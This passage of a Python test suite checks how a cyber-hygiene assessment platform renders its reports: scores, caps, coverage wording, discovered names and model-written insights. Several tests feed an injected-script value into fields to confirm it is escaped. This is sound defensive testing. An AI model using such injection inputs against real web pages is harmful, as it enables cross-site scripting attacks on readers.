    """Nothing may fall between the columns.

    A check whose outcome the renderer does not recognise must land somewhere. If it
    silently vanished, the section would still look complete -- three columns, plausible
    numbers -- while describing less of the methodology than it claims to.
    """
    checks = (*MIXED, check("A.six", "an_outcome_from_a_later_methodology"))
    page = render_report(report(checks=checks), locale="ro")
    counts = _column_counts(page)

    match = re.search(rf"(\d+) {re.escape(_TEXT['ro']['checked_not_applicable'])}", page)
    assert match is not None, "the leftover count is not rendered"
    assert sum(counts.values()) + int(match.group(1)) == len(checks)


def _checked_markup(page: str) -> str:
    """Just the three-column table.

    Asserting against the whole page does not work here: the stylesheet is inlined, so
    `dot-warning` appears in every report whether or not anything rendered with it. A
    mutation that gave failures and warnings the same dot passed a test written that way.
    """
    match = re.search(r'<table class="checked">.*?</table>', page, re.S)
    assert match is not None, "the checked table did not render"
    return match.group(0)


def test_a_failure_and_a_warning_are_told_apart() -> None:
    """Both need action, so they share a column; they do not need the same action, so they
    do not share a dot. "No SPF record" and "name servers all at one provider" are not the
    same sentence, and one colour for both makes the urgent one look routine."""
    markup = _checked_markup(render_report(report(checks=MIXED), locale="ro"))
    assert "dot-fail" in markup
    assert "dot-warning" in markup
    assert "dot-ok" in markup
    assert "dot-unknown" in markup


def test_an_older_report_without_checks_still_renders() -> None:
    """Documents built before this section existed carry no checks. They must render as
    they did rather than growing an empty box with three zeroes in it, which would read as
    "nothing was checked"."""
    page = render_report(report(checks=()), locale="ro")
    assert _TEXT["ro"]["checked_heading"] not in page


def test_the_checked_section_escapes_what_it_is_given() -> None:
    """Check titles come from the catalogue, but the identifier fall-back does not: an
    unknown check renders under whatever the database recorded."""
    page = render_report(
        report(checks=(ReportCheck(HOSTILE, HOSTILE, HOSTILE, "pass"),)), locale="ro"
    )
    assert "<script>" not in page
    assert "&lt;script&gt;" in page


def test_the_worst_result_across_subjects_is_the_one_reported() -> None:
    """An assessment covers the domain and any accepted asset, and one check can be
    evaluated against several of them.

    Taking the domain's own row -- or whichever the database happened to return last --
    would let a failure on an accepted subdomain be reported as a pass. `unknown` beats
    `pass` on the same reasoning: a subject we could not test is not evidence that the
    check is satisfied on it.
    """
    from siembiot.reports import worst_outcome_per_check

    worst = worst_outcome_per_check(
        [
            ("A.one", "pass"),
            ("A.one", "fail"),
            ("A.two", "pass"),
            ("A.two", "unknown"),
            ("A.three", "warning"),
            ("A.three", "fail"),
            ("A.four", "not_applicable"),
            ("A.four", "pass"),
            ("A.five", "pass"),
        ]
    )
    assert worst == {
        "A.one": "fail",
        "A.two": "unknown",
        "A.three": "fail",
        "A.four": "pass",
        "A.five": "pass",
    }


def test_an_outcome_from_a_later_methodology_never_outranks_a_known_failure() -> None:
    """A result this version has no opinion about must not be able to hide one it does.

    It sorts last, so a failure recorded beside it still wins, and on its own it is
    carried through to be counted rather than dropped.
    """
    from siembiot.reports import worst_outcome_per_check

    assert worst_outcome_per_check([("A.one", "fail"), ("A.one", "invented")]) == {"A.one": "fail"}
    assert worst_outcome_per_check([("A.two", "invented")]) == {"A.two": "invented"}


def test_the_action_column_opens_with_the_worst_of_it() -> None:
    """The list arrives by identifier, which groups by pillar and puts whichever pillar
    starts with A at the top regardless of how bad it is.

    That made the first red line the least urgent one, in a column a reader scans from the
    top, next to a findings list ordered the other way round.
    """
    checks = (
        check("A.warning_one", "warning"),
        check("B.failure", "fail"),
        check("C.warning_two", "warning"),
    )
    markup = _checked_markup(render_report(report(checks=checks), locale="ro"))
    positions = [
        markup.index(f"Titlu {name}") for name in ("B.failure", "A.warning_one", "C.warning_two")
    ]
    assert positions == sorted(positions), "a warning is rendered above a failure"


def test_a_list_of_structures_never_renders_as_a_python_repr() -> None:
    """What a public institution nearly read under "which ports".

    `str()` on a port record produced a dict repr, cut at eighty characters, so the
    report said `{'port': 22, 'service': 'ssh', 'exposure': 'remote_access', 'severity':`
    -- mid-key, and one field short of printing the software version off their own
    server. Items are named by a field a reader recognises, and a banner is not one.
    """
    from siembiot.reports import _evidence_rows

    rows = dict(
        _evidence_rows(
            {
                "open_ports": [
                    {"port": 22, "service": "ssh", "banner": "OpenSSH_8.9p1 Ubuntu"},
                    {"port": 3306, "service": "mysql", "banner": "8.0.35-0ubuntu0.22.04.1"},
                ]
            }
        )
    )
    assert rows["open_ports"] == "22, 3306"
    assert "{" not in rows["open_ports"]
    assert "OpenSSH" not in rows["open_ports"], "a service banner reached the report"


def test_a_list_longer_than_the_cap_says_how_many_it_left_out() -> None:
    """A list cut without saying so reads as the whole list."""
    from siembiot.reports import _evidence_rows

    rows = dict(_evidence_rows({"open_ports": [{"port": port} for port in range(20, 30)]}))
    assert rows["open_ports"].endswith("(+4)")


def test_an_item_with_nothing_recognisable_is_left_out_not_dumped() -> None:
    """The fall-back for a shape this code has not been taught. Showing an unreadable
    row would be worse than showing none: it looks like evidence and carries none."""
    from siembiot.reports import _evidence_rows

    assert _evidence_rows({"mystery": [{"unknown_shape": "value"}]}) == ()


def evidence_item(**overrides: object) -> ReportEvidence:
    base: dict[str, object] = {
        "observation_type": "email.dmarc",
        "subject": "primaria-exemplu.ro",
        "status": "absent",
        "attributes": (),
    }
    base.update(overrides)
    return ReportEvidence(**base)  # type: ignore[arg-type]


def insight(**overrides: object) -> ReportInsight:
    base: dict[str, object] = {
        "text": "DMARC lipsește, iar SPF nu este publicat: ambele sunt necesare.",
        "kind": "inferred",
        "evidence": (evidence_item(),),
    }
    base.update(overrides)
    return ReportInsight(**base)  # type: ignore[arg-type]


def test_the_model_reading_is_shown_when_there_is_one() -> None:
    """The model ran on every assessment for weeks, produced a dozen grounded sentences
    each time, and every one was assigned to a field nothing read. An institution paid
    for the analysis and saw only the template catalogue."""
    shown = visible_text(render_report(report(insights=(insight(),))))
    assert _TEXT["ro"]["insights_heading"] in shown
    assert "DMARC lipsește" in shown


def test_the_model_reading_carries_no_disclaimer_paragraph() -> None:
    """Removed at the operator's request.

    The heading still names the section as an automated reading, which is the signal that
    survives; what went was the paragraph of caveats under it. Pinned so it does not
    reappear the next time somebody edits this section.
    """
    shown = visible_text(render_report(report(insights=(insight(),))))
    assert "Scris de un model" not in shown
    assert _TEXT["ro"]["insights_heading"] in shown


def test_the_model_never_replaces_the_reviewed_steps() -> None:
    """The remediation catalogue cites the standard behind each instruction and was
    reviewed by a person. A model improvising "add this DNS record" is how somebody's
    mail stops being delivered, so its reading is added and never substituted."""
    document = report(
        findings=(
            finding(
                remediation_summary_ro="Publică DMARC.",
                remediation_steps_ro=("Publică o înregistrare TXT la _dmarc.",),
            ),
        ),
        insights=(insight(kind="recommended", text="Aș începe cu DMARC."),),
    )
    shown = visible_text(render_report(document))
    assert "Publică o înregistrare TXT la _dmarc." in shown, "the reviewed step disappeared"
    assert "Aș începe cu DMARC." in shown
    assert shown.index("Publică o înregistrare TXT") < shown.index("Aș începe cu DMARC."), (
        "the model's reading must follow the reviewed steps, not precede them"
    )


def test_a_report_without_a_model_reads_exactly_as_before() -> None:
    """No key, no gateway, or a model that returned nothing usable. The whole design
    rests on the report being complete without one, so the section is absent rather than
    empty."""
    shown = visible_text(render_report(report(insights=())))
    assert _TEXT["ro"]["insights_heading"] not in shown


def test_the_kind_of_claim_is_labelled() -> None:
    """ "This follows from the evidence" and "this is my suggestion" are different claims
    and a reader is entitled to know which one they are reading."""
    for kind, label in (("measured", "măsurat"), ("recommended", "recomandare")):
        shown = visible_text(render_report(report(insights=(insight(kind=kind),))))
        assert label in shown, kind


def test_model_text_cannot_carry_markup_into_the_page() -> None:
    """Every sentence here was written by a model that was shown data from somebody
    else's infrastructure. It is untrusted text and is escaped like all the rest."""
    page = render_report(
        report(
            insights=(
                insight(
                    text=HOSTILE,
                    evidence=(evidence_item(observation_type=HOSTILE, subject=HOSTILE),),
                ),
            )
        )
    )
    assert "<script>" not in page
    assert "&lt;script&gt;" in page


def test_the_models_own_inline_citation_is_not_printed_twice() -> None:
    """The model appends the evidence identifier to its own prose, and the report renders
    the identifiers separately. Both left in printed a 36-character UUID twice in a row,
    once mid-sentence, on a page written for somebody without a security team."""
    from siembiot.reports import _without_inline_citations

    assert (
        _without_inline_citations(
            "Domeniul nu are DNSSEC activ. [7d46d955-62bf-51e9-bc6b-2aa11a695980]"
        )
        == "Domeniul nu are DNSSEC activ."
    )


def test_only_identifiers_are_removed_from_what_the_model_wrote() -> None:
    """Silently deleting text a model wrote is how a sentence ends up meaning something
    its author did not. Only well-formed identifiers go."""
    from siembiot.reports import _without_inline_citations

    assert (
        _without_inline_citations("Text cu [paranteze] obișnuite păstrate.")
        == "Text cu [paranteze] obișnuite păstrate."
    )
    assert _without_inline_citations("Fără [not-a-uuid] nimic.") == "Fără [not-a-uuid] nimic."


def test_the_evidence_is_shown_rather_than_referenced_by_identifier() -> None:
    """An identifier on a page is not evidence.

    It proves a link exists to whoever can query the database and tells the reader
    nothing they can check or dispute. The observation itself is now one click away.
    """
    page = render_report(
        report(
            insights=(
                insight(
                    evidence=(
                        evidence_item(
                            observation_type="email.dmarc",
                            status="absent",
                            attributes=(("present", "false"),),
                        ),
                    ),
                ),
            )
        )
    )
    shown = visible_text(page)
    assert _TEXT["ro"]["insights_evidence"] in shown
    assert _TEXT["ro"]["obs.absent"] in shown
    assert _TEXT["ro"]["attr.present"] in shown
    assert "<details" in page, "the evidence must be foldable rather than always open"


def test_the_disclosure_needs_no_javascript() -> None:
    """The same document is rendered to PDF by an engine that runs none, and a report
    that needs a runtime to reveal its own evidence hides it from whoever reads the
    printed copy."""
    page = render_report(report(insights=(insight(),)))
    assert "<script" not in page
    assert "<details" in page and "<summary" in page


def test_a_printed_copy_opens_every_disclosure() -> None:
    """There is nothing to click on paper. A folded section in a PDF is evidence the
    reader cannot reach at all."""
    page = render_report(report(insights=(insight(),)))
    assert "@media print" in page
    printed = page[page.index("@media print") :]
    assert "insight-evidence" in printed


def test_a_claim_citing_evidence_this_run_does_not_hold_shows_no_disclosure() -> None:
    """The grounding validator is meant to make that impossible. If one slips through, a
    dangling reference invites a reader to treat an unverifiable claim as a checked one."""
    page = render_report(report(insights=(insight(evidence=()),)))
    assert "<details" not in page


def test_the_score_is_attributed_to_the_methodology_that_produced_it() -> None:
    """ "Metrorex has a security posture of 52.2/100" is a claim about their
    infrastructure. What the platform can support is narrower: a score its own
    methodology produced from what could be observed from outside.

    The distinction is the one already made by the "not an audit, not a certification"
    notice; this puts it beside the figure instead of leaving it in the footer, where a
    reader who takes the number and stops has already missed it.
    """
    shown = visible_text(render_report(report(score=52.2, methodology_version="1.2.0")))
    assert "metodologia de igienă cibernetică externă a acestei platforme" in shown
    assert "1.2.0" in shown
    assert "Nu este o măsurare directă a securității instituției." in shown


def test_the_coverage_figure_says_what_it_counts() -> None:
    """ "Acoperire 90.4%" reads as "90.4% of their infrastructure was assessed".

    It is neither of those things: it is the share of the methodology's applicable
    checks that reached a result, weighted by how much each check counts. The wording is
    taken from the computation rather than written around it, and it denies the wrong
    reading explicitly rather than leaving it available.
    """
    shown = visible_text(render_report(report(coverage_percentage=90.4)))
    assert "90.4% dintre verificările aplicabile ale metodologiei au produs un rezultat" in shown
    assert "ponderat după importanța fiecărei verificări" in shown
    assert "Nu se referă la cât din infrastructura instituției a fost analizată." in shown


def test_no_bare_coverage_label_survives_in_either_locale() -> None:
    """The label alone was the ambiguity. Pinned in both languages because the Romanian
    copy is the one an institution reads and the English one is easier to review."""
    for locale in LOCALES:
        assert _TEXT[locale]["coverage"] not in {"Acoperire", "Coverage"}


def test_the_report_shows_what_each_area_is_worth() -> None:
    """ "High importance" says e-mail matters more than reputation. It does not say it is
    a fifth of the total, and a reader deciding what to fix first is owed the arithmetic
    rather than an adjective."""
    shown = visible_text(
        render_report(report(pillars=(ReportPillar(pillar="email", score=34.2, weight=0.2),)))
    )
    assert "20%" in shown
    assert _TEXT["ro"]["of_the_score"] in shown


def test_the_report_explains_how_the_score_is_reached() -> None:
    """A deterministic methodology that does not show its working is indistinguishable
    from an opinion, and an institution disputing the figure had nothing to dispute."""
    shown = visible_text(render_report(report()))
    assert _TEXT["ro"]["how_scored_heading"] in shown
    assert "îndeplinită 1" in shown
    assert "nu scad scorul" in shown


def test_a_capped_score_says_so_and_says_why() -> None:
    """The one number that cannot be derived from the pillars above it: the arithmetic
    says one thing and the printed figure says another. Without the ceiling and its
    reason, the scoring looks arbitrary exactly where it is most deliberate."""
    shown = visible_text(
        render_report(
            report(
                score=54.0,
                uncapped_score=71.5,
                caps_applied=(
                    ReportCap(
                        cap_id="expired_certificate",
                        ceiling=54.0,
                        justification_ro="Un certificat expirat întrerupe accesul securizat.",
                        justification_en="An expired certificate breaks secure access.",
                        triggering_check_ids=("C.certificate_validity",),
                    ),
                ),
            )
        )
    )
    assert _TEXT["ro"]["cap_heading"] in shown
    assert "54" in shown and "71.5" in shown, "both the ceiling and the uncapped score"
    assert "Un certificat expirat întrerupe accesul securizat." in shown


def test_an_uncapped_score_says_nothing_about_caps() -> None:
    """Most reports hit no ceiling. A heading explaining one that did not apply is noise
    that teaches a reader to skip the section on the report where it matters."""
    shown = visible_text(render_report(report(caps_applied=())))
    assert _TEXT["ro"]["cap_heading"] not in shown


def test_the_cap_reason_is_the_reviewed_one_not_an_invented_one() -> None:
    """The justification is written in the methodology, in both languages, at the time
    the cap was. Rendering it means the report explains a capped score in words somebody
    reviewed rather than a phrase composed at render time."""
    for locale, expected in (("ro", "Motiv românesc."), ("en", "English reason.")):
        shown = visible_text(
            render_report(
                report(
                    uncapped_score=80.0,
                    caps_applied=(
                        ReportCap(
                            cap_id="no_https",
                            ceiling=54.0,
                            justification_ro="Motiv românesc.",
                            justification_en="English reason.",
                        ),
                    ),
                ),
                locale=locale,
            )
        )
        assert expected in shown, locale


def asset_group(**overrides: object) -> ReportAssetGroup:
    base: dict[str, object] = {
        "basis": "subdomain_of_authorized_domain",
        "confidence": 0.9,
        "names": ("mail.exemplu.ro", "vpn.exemplu.ro"),
        "omitted": 0,
        "shared_hosting": 0,
    }
    base.update(overrides)
    return ReportAssetGroup(**base)  # type: ignore[arg-type]


def test_discovered_names_are_listed_not_just_counted() -> None:
    """ "83 discovered, 62 low-confidence" is a number an institution can neither check
    nor act on: not which 62, not why they are weaker, not whether the 20 stronger ones
    are theirs."""
    shown = visible_text(render_report(report(asset_groups=(asset_group(),))))
    assert _TEXT["ro"]["assets_heading"] in shown
    assert "mail.exemplu.ro" in shown
    assert "0.9" in shown


def test_the_basis_of_each_claim_is_named() -> None:
    """A subdomain of the authorized domain is a different claim from a name that merely
    resolves to the same address. Listing both as "discovered assets" would assert an
    ownership the platform has not established."""
    shown = visible_text(
        render_report(
            report(
                asset_groups=(
                    asset_group(basis="subdomain_of_authorized_domain", confidence=0.9),
                    asset_group(basis="unrelated_name", confidence=0.2, names=("altceva.ro",)),
                )
            )
        )
    )
    assert _TEXT["ro"]["basis.subdomain_of_authorized_domain"] in shown
    assert _TEXT["ro"]["basis.unrelated_name"] in shown


def test_a_truncated_group_says_how_many_it_left_out() -> None:
    """Sixty-two names is not a list anybody reads, but a list cut without saying so
    reads as the whole list."""
    shown = visible_text(render_report(report(asset_groups=(asset_group(omitted=50),))))
    assert _TEXT["ro"]["asset_omitted"] in shown
    assert "50" in shown


def test_shared_hosting_is_flagged_where_it_applies() -> None:
    """Resolving to the same address as somebody else says nothing about who owns what,
    and a reader deciding whether a name is theirs needs to know that."""
    shown = visible_text(render_report(report(asset_groups=(asset_group(shared_hosting=3),))))
    assert _TEXT["ro"]["asset_shared"] in shown


def test_the_names_are_not_claimed_as_confirmed_assets() -> None:
    """Discovery is not ownership. The platform found names in public logs; the
    organization decides what belongs to it, and the report has to say so beside the
    list rather than leave the heading to imply otherwise."""
    shown = visible_text(render_report(report(asset_groups=(asset_group(),))))
    assert "Nu sunt active confirmate" in shown


def test_a_domain_with_no_discovered_names_shows_no_section() -> None:
    shown = visible_text(render_report(report(asset_groups=())))
    assert _TEXT["ro"]["assets_heading"] not in shown


def test_a_discovered_name_cannot_carry_markup_into_the_page() -> None:
    """Names come from other people's certificates, which is to say from strings somebody
    else chose and put in a public log on purpose."""
    page = render_report(report(asset_groups=(asset_group(names=(HOSTILE,)),)))
    assert "<script>" not in page
    assert "&lt;script&gt;" in page


def test_a_check_that_was_not_performed_is_named_not_just_identified() -> None:
    """ "D.database_exposed" names the check to whoever maintains the catalogue and to
    nobody else. The reader is being told part of the assessment did not happen, and the
    identifier does not tell them which part."""
    document = report(
        checks=(
            ReportCheck(
                check_id="D.database_exposed",
                title_ro="Bazele de date nu sunt expuse public",
                title_en="Databases are not publicly exposed",
                outcome="not_applicable",
            ),
        ),
        withheld_checks=("D.database_exposed",),
    )
    shown = visible_text(render_report(document))
    assert "Bazele de date nu sunt expuse public" in shown
    assert "D.database_exposed" in shown, "the identifier stays for anybody disputing it"


def test_the_summary_says_how_many_needed_an_authorization() -> None:
    """A reader seeing "9 do not apply" has no way to know three of them are port checks
    a passive run is not permitted to make. That is the boundary working, and the page
    should say so rather than leave it looking like something was skipped."""
    document = report(
        checks=(
            ReportCheck("D.database_exposed", "Baze de date", "Databases", "not_applicable"),
            ReportCheck("D.remote_access_exposed", "Acces la distanță", "Remote", "not_applicable"),
            ReportCheck("A.registration_expiry", "Expirare", "Expiry", "not_applicable"),
        ),
        withheld_checks=("D.database_exposed", "D.remote_access_exposed"),
    )
    shown = visible_text(render_report(document))
    assert _TEXT["ro"]["checked_withheld"] in shown
    assert "2 " + _TEXT["ro"]["checked_withheld"] in shown


def test_a_run_that_withheld_nothing_says_nothing_about_authorization() -> None:
    """An explanation of a boundary nothing hit is noise on the reports where it did."""
    document = report(
        checks=(ReportCheck("A.registration_expiry", "Expirare", "Expiry", "not_applicable"),),
        withheld_checks=(),
    )
    assert _TEXT["ro"]["checked_withheld"] not in visible_text(render_report(document))
